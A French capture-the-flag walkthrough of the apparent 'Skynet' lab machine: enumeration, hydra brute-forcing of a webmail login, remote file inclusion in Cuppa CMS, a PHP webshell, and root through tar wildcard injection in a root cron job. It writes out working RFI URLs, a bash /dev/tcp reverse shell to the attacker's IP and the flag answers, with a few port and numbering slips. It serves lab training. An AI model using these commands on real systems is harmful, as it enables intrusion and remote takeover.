[IP_VPN] : 10.18.94.166
[IP_MACHINE] : 10.10.61.62

# Task 1 

## What is Miles password for his emails?

On commence par énumérer les ports avec un nmap :

``` 
nmap 10.10.61.62 -sS -sV -Pn

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Comme on le connait pas la liste des répertoires associés, on lance un GoBuster :

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.61.62  

===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.61.62
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/08/25 04:29:30 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 310] [--> http://10.10.61.62/admin/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.61.62/css/]
/js                   (Status: 301) [Size: 307] [--> http://10.10.61.62/js/]
/config               (Status: 301) [Size: 311] [--> http://10.10.61.62/config/]
/ai                   (Status: 301) [Size: 307] [--> http://10.10.61.62/ai/]
/squirrelmail         (Status: 301) [Size: 317] [--> http://10.10.61.62/squirrelmail/]
/server-status        (Status: 403) [Size: 276]
```
En parrallèle, on peut voir que dans les resultats nmap ressort un serveru samba. 
On va donc l'examiner en commencant par trouver différentes sessions : 

``` 
smbmap -H 10.10.61.62 
[+] Guest session       IP: 10.10.61.62:445     Name: 10.10.61.62                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))
```

On remarque qu'une session est appellée "anonymous" et possède la permission "READ ONLY".
Se connecter au répertoire anonymois du server samba : 

``` 
smbclient //10.10.61.62/anonymous 

smb: \> ls
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019
```
On remarque qu'il y a un fichier **attention.txt** et un dossier **logs**
On va télécharger le contenu : 

```
get attention.txt 
cd logs
get log1.txt
get log2.txt 
get log3.txt 
```
Comme il n'y a plus rien à voir dans ce share samba, alons regarder ce qu'il y a dans les différents fichiers récupérés :

Fichier attention.txt : Nous informe que le mot de passe doit être changé 
Fichier log1.txt : Nous donne une liste de mot de passes potentiels 
Fichiers log2.txt et log3.txt : Rien dedans 

GoBuster est fini, une url est intrigante : **/squirrelmail** 
On se rend sur la page et on tombe sur une page d'autentification avec la version de l'application :

**SquirrelMail version 1.4.23**

D'après la recherche sur les sessions Samba, une session s'appelle **milesdyson**
D'après le fichier **logs/log1.txt** ca ressemble étrangement à des mots de passes.
On va essayer brutforcer le mot de passe du compte **milesdyson** avec la liste **log1.txt** via hydra 

```
hydra -l milesdyson -P log1.txt 10.10.61.62 http-post-form '/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect.'

[80][http-post-form] host: 10.10.61.62   login: milesdyson   password: cyborg007haloterminator

```
Let's go ! On a un mot de passe associé à l'utilisateru milesdyson

**login: milesdyson   password: cyborg007haloterminator**

Réponse 1 : **cyborg007haloterminator**


## What is the hidden directory?

Dans le share samba, il y avait un fichier nommer attention.txt, celui-ci disait que le mot de passe devait être changé or dans la messagerie, un mail précise que "le mot de passe qui a été modifié"

```We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```
On va se connecter sur share samba avec l'utilisateur **milesdyson** et le mot de passe **)s{A&2Z=F^n_E.B`**

```
smbclient -U milesdyson //10.10.61.62/milesdyson
```
en fouillant un peu, il y a un dossier **notes** qui contient un fichier **important.txt**
Téléchargeons le et regardons son contenu : 

```
cat important.txt                              

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

On peut voir dans la note, qu'un fichier qui n'a pas été listé par GoBuster. 

Réponse 2 : **/45kra24zxs28v3yd**

## What is the vulnerability called when you can include a remote file for malicious purposes?

Un peu de recherche sur la toile : 

Réponse 3 :**Remote File Inclusion** 

## What is the user flag?

Comme on arrive sur une simple page, on va GoBuster à nouveau : 

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.61.62/45kra24zxs28v3yd  
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.61.62/45kra24zxs28v3yd
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/08/25 05:43:12 Starting gobuster in directory enumeration mode
===============================================================
/administrator        (Status: 301) [Size: 335] [--> http://10.10.61.62/45kra24zxs28v3yd/administrator/]
```

Go se rendre sur la page : http://10.10.61.62/45kra24zxs28v3yd/administrator

Oh un CMS ! Est-ce qu'une vulérabilité est dispo dessus ?

```
searchsploit cuppa                                                             
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                                                                                                           | php/webapps/25971.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- 
```
Let's goo ! Go l'exploiter en téléchargeant l'exploit : 

``` searchsploit -m 25971.txt ```

L'exploit nous dit que : 

*An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.*
 
*TRADUCTION* 

*Un attaquant peut inclure des fichiers PHP locaux ou distants ou lire des fichiers non-PHP avec cette vulnérabilité. Des données altérées par l'utilisateur sont utilisées lors de la création du nom de fichier qui sera inclus dans le fichier courant. Le code PHP contenu dans ce fichier sera évalué, le code non-PHP sera intégré à la sortie. Cette vulnérabilité peut conduire à la compromission totale du serveur.*

Ce qui veut dire qu'une RFI est possible (Réponse 2). 

Pour cela, il faut se rendre sur l'adresse suivante : "http://10.10.61.62/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd" 
(les explications de cette addresses sont donnés dans le fichier de l'exploit") 

On peut voir qu'on a accès au fichier /etc/passwd ! 

Bon, pour aller plus vite on va utiliser un revershell en php qu'on uploadera sur la machine via l'URL 

1. On télécharge un script pour executer un revershell :
```
https://pentestmonkey.net/tools/web-shells/php-reverse-shell
``` 
```
1. On modifie l'IP et le port dans le fichier 

2. On va lancer un listener sur le port définit dans le "php-reverse-shell".
``` nc -lvnp 4444```

3. Pour le télécharger sur la machine distante, on va créer un serveur python 
```python3 -m http.serveur```

4. Se rendre sur l'adresse suivante : 

http://10.10.61.62/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.18.94.166/php-reverse-shell.php

5. On regarde le listener et hop, une session est lancée ! 

6. Puis on cherche le mot de passe : 
```
cat /home/milesdyson/user.txt

7ce5c2109a40f958099283600a9ae807
```
Réponse 4 : ** 7ce5c2109a40f958099283600a9ae807 ** 
On récupère le fichier présent à l'[IP_VPN] sur le port 8000 (serveur python) et on fait une redirection vers le port 4444 (fichier shell.php) 

### Ou Alors 2 eme solution : 

1. On créer un WebShell dans un fichier "shell.php"
``` 
<?php
system($_REQUEST['cmd']);
?>
```
2. On l'éxécute dans l'URL 
3. On cherche pas à pas jusqu'à tomber sur le fichier user.txt

Ce qui donne le chemin suivant : http://10.10.61.62/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.18.94.166/shell.php&cmd=cat+/home/milesdyson/user.txt

Réponse 4 : **7ce5c2109a40f958099283600a9ae807**
 
## What is the root flag?

Commençons par stabilier le shell : 
``` python -c 'import pty; pty.spawn("/bin/bash")' ```

Ensuite, il faut escalader les privilèges. Pour cela, revoyons ce que nous avions fait dans les rooms précédentes : 
Afficher les plannificateur de tâches (Scheduler)

```
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```
On s'aperçoit que toutes les minutes, un script backup.sh est lancé

qu'est-ce qu'il y a dans ce fichier :

``` 
www-data@skynet:/home/milesdyson/backups$ cat backup.sh 
cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```
Quels sont les droits des fichiers dans le dossier ? 

``` 
www-data@skynet:/home/milesdyson/backups$ ls -l
ls -l
total 4576
-rwxr-xr-x 1 root root      74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root root 4679680 Aug 25 07:17 backup.tgz
```
Donc en résumé : Il existe un script de sauvegarde ( backup.sh) qui compresse l'ensemble du répertoire /var/www/html avec tar et enregistre l'archive dans le répertoire personnel de l'utilisateur miles. Le script est exécuté par "root" toutes les minutes. 

Du coup pour escalader les privilèges, on va exécuter un shell privilégié avec tar exécuté par root
``` tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh ```

Utilisons-le pour créer un revershell privilégié. Pour ajouter les 2 options requises, nous allons créer des fichiers 

```
printf '#!/bin/bash\nbash -i >& /dev/tcp/10.18.94.166/1212 0>&1' > /var/www/html/shell
chmod +x /var/www/html/shell
touch /var/www/html/--checkpoint=1
touch /var/www/html/--checkpoint-action=exec=bash\ shell
```
Ensuite on va se rendre dans le fichier /var/www/html 
```
cd /var/www/html && ls

rw-rw-rw- 1 www-data www-data     0 Aug 25 07:33 --checkpoint-action=exec=bash shell
-rw-rw-rw- 1 www-data www-data     0 Aug 25 07:33 --checkpoint=1
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rwxrwxrwx 1 www-data www-data    54 Aug 25 07:32 shell
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
```
On retrouve les fichiers **--checkpoint-action=exec=bash shell**, **--checkpoint=1** et **shell**

Pour pouvoir obtenir un shell avec les privilèges root, il faut lancer un listener sur le port 1212 (port dans le script shell)
``` nc -lvnp 1234```

On éxécute le script shell 
``` ./shell```

Et hop, nous voila **ROOT** sur le listener !! 

Maintenant, plus qu'à récupérer le flag root.txt

Comme on doit avoir des privilèges pour ce flag, on suppose qu'il se trouve dans un fichier avec des privilèges spéciaux pour y accéder. 

```
cat root/root.txt

3f0372db24753accc7179a282cd6a949
```

Réponse 5 : **3f0372db24753accc7179a282cd6a949** 


[P0WN3D]
